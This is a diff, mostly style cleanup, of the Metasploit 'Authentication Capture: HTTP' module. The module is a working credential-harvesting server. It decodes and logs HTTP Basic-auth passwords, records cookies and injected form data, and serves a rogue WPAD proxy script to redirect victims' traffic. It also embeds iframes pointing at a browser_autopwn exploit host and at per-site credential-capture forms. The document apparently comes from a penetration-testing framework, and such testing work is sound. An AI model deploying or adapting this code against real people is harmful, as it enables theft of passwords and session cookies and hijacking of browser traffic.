@@ -3,50 +3,54 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'English'
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
-
   def initialize
     super(
-      'Name'        => 'Authentication Capture: HTTP',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: HTTP',
+      'Description' => %q{
         This module provides a fake HTTP service that
       is designed to capture authentication credentials.
       },
-      'Author'      => ['ddz', 'hdm'],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'Capture', 'Description' => 'Run capture web server' ]
-        ],
-      'PassiveActions' =>
-        [
-          'Capture'
-        ],
-      'DefaultAction'  => 'Capture'
+      'Author' => ['ddz', 'hdm'],
+      'License' => MSF_LICENSE,
+      'Actions' => [
+        [ 'Capture', { 'Description' => 'Run capture web server' } ]
+      ],
+      'PassiveActions' => [
+        'Capture'
+      ],
+      'DefaultAction' => 'Capture',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
     )
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
-        OptPath.new('TEMPLATE',   [ false, "The HTML template to serve in responses",
-            File.join(Msf::Config.data_directory, "exploits", "capture", "http", "index.html")
-          ]
-        ),
-        OptPath.new('SITELIST',   [ false, "The list of URLs that should be used for cookie capture",
-            File.join(Msf::Config.data_directory, "exploits", "capture", "http", "sites.txt")
-          ]
-        ),
-        OptPath.new('FORMSDIR',   [ false, "The directory containing form snippets (example.com.txt)",
-            File.join(Msf::Config.data_directory, "exploits", "capture", "http", "forms")
-          ]
-        ),
-        OptAddress.new('AUTOPWN_HOST',[ false, "The IP address of the browser_autopwn service ", nil ]),
-        OptPort.new('AUTOPWN_PORT',[ false, "The SRVPORT port of the browser_autopwn service ", nil ]),
-        OptString.new('AUTOPWN_URI',[ false, "The URIPATH of the browser_autopwn service ", nil ]),
-      ])
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 80 ]),
+        OptPath.new('TEMPLATE', [
+          false, 'The HTML template to serve in responses',
+          File.join(Msf::Config.data_directory, 'exploits', 'capture', 'http', 'index.html')
+        ]),
+        OptPath.new('SITELIST', [
+          false, 'The list of URLs that should be used for cookie capture',
+          File.join(Msf::Config.data_directory, 'exploits', 'capture', 'http', 'sites.txt')
+        ]),
+        OptPath.new('FORMSDIR', [
+          false, 'The directory containing form snippets (example.com.txt)',
+          File.join(Msf::Config.data_directory, 'exploits', 'capture', 'http', 'forms')
+        ]),
+        OptAddress.new('AUTOPWN_HOST', [ false, 'The IP address of the browser_autopwn service ', nil ]),
+        OptPort.new('AUTOPWN_PORT', [ false, 'The SRVPORT port of the browser_autopwn service ', nil ]),
+        OptString.new('AUTOPWN_URI', [ false, 'The URIPATH of the browser_autopwn service ', nil ]),
+      ]
+    )
   end
 
   # Not compatible today
@@ -58,41 +62,44 @@ class MetasploitModule < Msf::Auxiliary
     @formsdir = datastore['FORMSDIR']
     @template = datastore['TEMPLATE']
     @sitelist = datastore['SITELIST']
-    @myhost   = datastore['SRVHOST']
-    @myport   = datastore['SRVPORT']
+    @myhost = datastore['SRVHOST']
+    @myport = datastore['SRVPORT']
 
-    @myautopwn_host =  datastore['AUTOPWN_HOST']
-    @myautopwn_port =  datastore['AUTOPWN_PORT']
-    @myautopwn_uri  =  datastore['AUTOPWN_URI']
-    @myautopwn      = false
+    @myautopwn_host = datastore['AUTOPWN_HOST']
+    @myautopwn_port = datastore['AUTOPWN_PORT']
+    @myautopwn_uri = datastore['AUTOPWN_URI']
+    @myautopwn = false
 
-    if(@myautopwn_host and @myautopwn_port and @myautopwn_uri)
+    if @myautopwn_host && @myautopwn_port && @myautopwn_uri
       @myautopwn = true
     end
 
-    exploit()
+    exploit
   end
 
-  def on_client_connect(c)
-    c.extend(Rex::Proto::Http::ServerClient)
-    c.init_cli(self)
+  def on_client_connect(client)
+    client.extend(Rex::Proto::Http::ServerClient)
+    client.init_cli(self)
   end
 
   def on_client_data(cli)
     begin
       data = cli.get_once(-1, 5)
-      raise ::Errno::ECONNABORTED if !data or data.length == 0
+      raise ::Errno::ECONNABORTED if !data || data.empty?
+
       case cli.request.parse(data)
-        when Rex::Proto::Http::Packet::ParseCode::Completed
-          dispatch_request(cli, cli.request)
-          cli.reset_cli
-        when  Rex::Proto::Http::Packet::ParseCode::Error
-          close_client(cli)
+      when Rex::Proto::Http::Packet::ParseCode::Completed
+        dispatch_request(cli, cli.request)
+        cli.reset_cli
+      when Rex::Proto::Http::Packet::ParseCode::Error
+        close_client(cli)
       end
-    rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
-    rescue ::OpenSSL::SSL::SSLError
-    rescue ::Exception
-      print_error("Error: #{$!.class} #{$!} #{$!.backtrace}")
+    rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET => e
+      vprint_error(e.message)
+    rescue ::OpenSSL::SSL::SSLError => e
+      vprint_error(e.message)
+    rescue StandardError
+      print_error("Error: #{$ERROR_INFO.class} #{$ERROR_INFO} #{$ERROR_INFO.backtrace}")
     end
 
     close_client(cli)
@@ -131,87 +138,80 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def dispatch_request(cli, req)
-
-    phost = cli.peerhost
+    cli.peerhost
 
     os_name = nil
-    os_type = nil
-    os_vers = nil
-    os_arch = 'x86'
 
     ua_name = nil
     ua_vers = nil
 
     ua = req['User-Agent']
 
-    case (ua)
-      when /rv:([\d\.]+)/
-        ua_name = 'FF'
-        ua_vers = $1
-      when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]+\.[0-9]+)/
-        ua_name = 'IE'
-        ua_vers = $1
-      when /Version\/(\d+\.\d+\.\d+).*Safari/
-        ua_name = 'Safari'
-        ua_vers = $1
+    case ua
+    when /rv:([\d.]+)/
+      ua_name = 'FF'
+      ua_vers = ::Regexp.last_match(1)
+    when %r{Mozilla/[0-9]\.[0-9] \(compatible; MSIE ([0-9]+\.[0-9]+)}
+      ua_name = 'IE'
+      ua_vers = ::Regexp.last_match(1)
+    when %r{Version/(\d+\.\d+\.\d+).*Safari}
+      ua_name = 'Safari'
+      ua_vers = ::Regexp.last_match(1)
     end
 
-    case (ua)
-      when /Windows/
-        os_name = 'Windows'
-      when /Linux/
-        os_name = 'Linux'
-      when /iPhone/
-        os_name = 'iPhone'
-        os_arch = 'armle'
-      when /Mac OS X/
-        os_name = 'Mac'
+    case ua
+    when /Windows/
+      os_name = 'Windows'
+    when /Linux/
+      os_name = 'Linux'
+    when /iPhone/
+      os_name = 'iPhone'
+      'armle'
+    when /Mac OS X/
+      os_name = 'Mac'
     end
 
-    case (ua)
-      when /PPC/
-        os_arch = 'ppc'
+    case ua
+    when /PPC/
+      'ppc'
     end
 
     os_name ||= 'Unknown'
 
     mysrc = Rex::Socket.source_address(cli.peerhost)
-    hhead = (req['Host'] || @myhost)
+    hhead = req['Host'] || @myhost
 
-    if req.resource =~ /^http\:\/+([^\/]+)(\/*.*)/
-      hhead = $1
-      req.resource = $2
+    if req.resource =~ %r{^http:/+([^/]+)(/*.*)}
+      hhead = ::Regexp.last_match(1)
+      req.resource = ::Regexp.last_match(2)
     end
 
     if hhead =~ /^(.*):(\d+)\s*$/
-      hhead = $1
-      nport = $2.to_i
+      hhead = ::Regexp.last_match(1)
+      nport = ::Regexp.last_match(2).to_i
     end
 
     @myport = nport || 80
 
-
     cookies = req['Cookie'] || ''
 
-
-    if(cookies.length > 0)
+    if !cookies.empty?
       report_note(
         :host => cli.peerhost,
         :type => "http_cookies",
-        :data => hhead + " " + cookies,
+        :data => { :cookies => hhead + " " + cookies },
         :update => :unique_data
       )
     end
 
-
-    if(req['Authorization'] and req['Authorization'] =~ /basic/i)
-      basic,auth = req['Authorization'].split(/\s+/)
-      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
+    if req['Authorization'] && req['Authorization'] =~ /basic/i
+      _, auth = req['Authorization'].split(/\s+/)
+      user, pass = Rex::Text.decode_base64(auth).split(':', 2)
 
       report_cred(
         ip: cli.peerhost,
         port: @myport,
-        service_name: (ssl ? "https" : "http"),
+        service_name: (ssl ? 'https' : 'http'),
         user: user,
         pass: pass,
         proof: req.resource.to_s
@@ -220,42 +220,40 @@ class MetasploitModule < Msf::Auxiliary
       report_note(
         :host     => cli.peerhost,
         :type     => "http_auth_extra",
-        :data     => req.resource.to_s,
+        :data     => { :auth_extra => req.resource.to_s },
         :update => :unique_data
       )
       print_good("HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
     end
 
-
-    if(req.resource =~ /^\/*wpad.dat|.*\.pac$/i)
+    if (req.resource =~ %r{^/*wpad.dat|.*\.pac$}i)
       prx = "function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }"
       res =
-        "HTTP/1.1 200 OK\r\n" +
-        "Host: #{hhead}\r\n" +
-        "Content-Type: application/x-ns-proxy-autoconfig\r\n" +
-        "Content-Length: #{prx.length}\r\n" +
+        "HTTP/1.1 200 OK\r\n" \
+        "Host: #{hhead}\r\n" \
+        "Content-Type: application/x-ns-proxy-autoconfig\r\n" \
+        "Content-Length: #{prx.length}\r\n" \
         "Connection: Close\r\n\r\n#{prx}"
       print_status("HTTP wpad.dat sent to #{cli.peerhost}")
       cli.put(res)
       return
     end
 
-
-    if(req.resource =~ /\/+formrec\/(.*)/i)
-      data = Rex::Text.uri_decode($1).split("\x00").join(", ")
+    if (req.resource =~ %r{/+formrec/(.*)}i)
+      data = Rex::Text.uri_decode(::Regexp.last_match(1)).split("\x00").join(', ')
 
       report_note(
         :host => cli.peerhost,
         :type => "http_formdata",
-        :data => hhead + " " + data,
+        :data => { :formdata => hhead + " " + data },
         :update => :unique_data
       )
 
       res =
-        "HTTP/1.1 200 OK\r\n" +
-        "Host: #{hhead}\r\n" +
-        "Content-Type: text/html\r\n" +
-        "Content-Length: 4\r\n" +
+        "HTTP/1.1 200 OK\r\n" \
+        "Host: #{hhead}\r\n" \
+        "Content-Type: text/html\r\n" \
+        "Content-Length: 4\r\n" \
         "Connection: Close\r\n\r\nBYE!"
 
       print_status("HTTP form data received for #{hhead} from #{cli.peerhost} (#{data})")
@@ -266,42 +264,40 @@ class MetasploitModule < Msf::Auxiliary
     report_note(
       :host => cli.peerhost,
       :type => "http_request",
-      :data => "#{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers}",
+      :data => { :request => "#{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers}" },
       :update => :unique_data
     )
 
     print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}")
 
-    if(req.resource =~ /\/+forms.html$/)
+    if (req.resource =~ %r{/+forms.html$})
       frm = inject_forms(hhead)
       res =
-        "HTTP/1.1 200 OK\r\n" +
-        "Host: #{hhead}\r\n" +
-        "Content-Type: text/html\r\n" +
-        "Content-Length: #{frm.length}\r\n" +
+        "HTTP/1.1 200 OK\r\n" \
+        "Host: #{hhead}\r\n" \
+        "Content-Type: text/html\r\n" \
+        "Content-Length: #{frm.length}\r\n" \
         "Connection: Close\r\n\r\n#{frm}"
       cli.put(res)
       return
     end
 
-
     # http://us.version.worldofwarcraft.com/update/PatchSequenceFile.txt
-    if(req.resource == "/update/PatchSequenceFile.txt")
+    if (req.resource == '/update/PatchSequenceFile.txt')
       print_status("HTTP #{cli.peerhost} is trying to play World of Warcraft")
     end
-
 
     # Microsoft 'Network Connectivity Status Indicator' Vista
     if (req['Host'] == 'www.msftncsi.com')
       print_status("HTTP #{cli.peerhost} requested the Network Connectivity Status Indicator page (Vista)")
-      data = "Microsoft NCSI"
-      res  =
-        "HTTP/1.1 200 OK\r\n" +
-        "Host: www.msftncsi.com\r\n" +
-        "Expires: 0\r\n" +
-        "Cache-Control: must-revalidate\r\n" +
-        "Content-Type: text/html\r\n" +
-        "Content-Length: #{data.length}\r\n" +
+      data = 'Microsoft NCSI'
+      res =
+        "HTTP/1.1 200 OK\r\n" \
+        "Host: www.msftncsi.com\r\n" \
+        "Expires: 0\r\n" \
+        "Cache-Control: must-revalidate\r\n" \
+        "Content-Type: text/html\r\n" \
+        "Content-Length: #{data.length}\r\n" \
         "Connection: Close\r\n\r\n#{data}"
       cli.put(res)
       return
@@ -327,17 +323,16 @@ class MetasploitModule < Msf::Auxiliary
     # Microsoft ActiveX Download
     if (req['Host'] == 'activex.microsoft.com')
       print_status("HTTP #{cli.peerhost} attempted to download an ActiveX control")
-      data = ""
-      res  =
-        "HTTP/1.1 404 Not Found\r\n" +
-        "Host: #{mysrc}\r\n" +
-        "Content-Type: application/octet-stream\r\n" +
-        "Content-Length: #{data.length}\r\n" +
+      data = ''
+      res =
+        "HTTP/1.1 404 Not Found\r\n" \
+        "Host: #{mysrc}\r\n" \
+        "Content-Type: application/octet-stream\r\n" \
+        "Content-Length: #{data.length}\r\n" \
         "Connection: Close\r\n\r\n#{data}"
       cli.put(res)
       return
     end
-
 
     # Sonic.com's Update Service
     if (req['Host'] == 'updateservice.sonic.com')
@@ -357,92 +352,88 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # The itunes store on the iPhone
-    if(req['Host'] == 'phobos.apple.com')
+    if (req['Host'] == 'phobos.apple.com')
       print_status("HTTP #{cli.peerhost} is using iTunes Store on the iPhone")
       # GET /bag.xml
     end
 
-
     # Handle image requests
-    ctypes  =
-    {
-      "jpg"   => "image/jpeg",
-      "jpeg"  => "image/jpeg",
-      "png"   => "image/png",
-      "gif"   => "image/gif",
-    }
+    ctypes =
+      {
+        'jpg' => 'image/jpeg',
+        'jpeg' => 'image/jpeg',
+        'png' => 'image/png',
+        'gif' => 'image/gif'
+      }
 
-    req_ext = req.resource.split(".")[-1].downcase
+    req_ext = req.resource.split('.')[-1].downcase
 
-    if(ctypes[req_ext])
+    if ctypes[req_ext]
       ctype = ctypes['gif']
 
       data =
-        "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00" +
-        "\x00\xff\xff\xff\xff\xff\xff\x2c\x00\x00\x00\x00" +
+        "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00" \
+        "\x00\xff\xff\xff\xff\xff\xff\x2c\x00\x00\x00\x00" \
         "\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
 
       res =
-        "HTTP/1.1 200 OK\r\n" +
-        "Host: #{mysrc}\r\n" +
-        "Content-Type: #{ctype}\r\n" +
-        "Content-Length: #{data.length}\r\n" +
+        "HTTP/1.1 200 OK\r\n" \
+        "Host: #{mysrc}\r\n" \
+        "Content-Type: #{ctype}\r\n" \
+        "Content-Length: #{data.length}\r\n" \
         "Connection: Close\r\n\r\n#{data}"
       cli.put(res)
       return
     end
 
-
     buff = ''
 
-
-    if(@myautopwn)
+    if @myautopwn
       buff << "<iframe src='http://#{@myautopwn_host}:#{@myautopwn_port}#{@myautopwn_uri}'></iframe>"
     end
 
     list = File.readlines(@sitelist)
     list.each do |site|
       next if site =~ /^#/
+
       site.strip!
-      next if site.length == 0
+      next if site.empty?
+
       buff << "<iframe src='http://#{site}:#{@myport}/forms.html'></iframe>"
     end
 
     data = File.read(@template)
     data.gsub!(/%CONTENT%/, buff)
 
-    res  =
-      "HTTP/1.1 200 OK\r\n" +
-      "Host: #{mysrc}\r\n" +
-      "Expires: 0\r\n" +
-      "Cache-Control: must-revalidate\r\n" +
-      "Content-Type: text/html\r\n" +
-      "Content-Length: #{data.length}\r\n" +
+    res =
+      "HTTP/1.1 200 OK\r\n" \
+      "Host: #{mysrc}\r\n" \
+      "Expires: 0\r\n" \
+      "Cache-Control: must-revalidate\r\n" \
+      "Content-Type: text/html\r\n" \
+      "Content-Length: #{data.length}\r\n" \
       "Connection: Close\r\n\r\n#{data}"
 
     cli.put(res)
     return
-
   end
 
-
   def inject_forms(site)
+    domain = site.gsub(%r{(\.\.|\\|/)}, '')
+    domain = 'www.' + domain if domain !~ /^www/i
 
-    domain = site.gsub(/(\.\.|\\|\/)/, "")
-    domain = "www." + domain if domain !~ /^www/i
+    until domain.empty?
 
-    while(domain.length > 0)
-
-      form_file = File.join(@formsdir, domain) + ".txt"
-      form_data = ""
-      if (File.readable?(form_file))
+      form_file = File.join(@formsdir, domain) + '.txt'
+      form_data = ''
+      if File.readable?(form_file)
         form_data = File.read(form_file)
         break
       end
 
-      parts = domain.split(".")
+      parts = domain.split('.')
       parts.shift
-      domain = parts.join(".")
+      domain = parts.join('.')
     end
 
     %|
@@ -485,6 +476,5 @@ class MetasploitModule < Msf::Auxiliary
 </body>
 </html>
 |
-
   end
 end
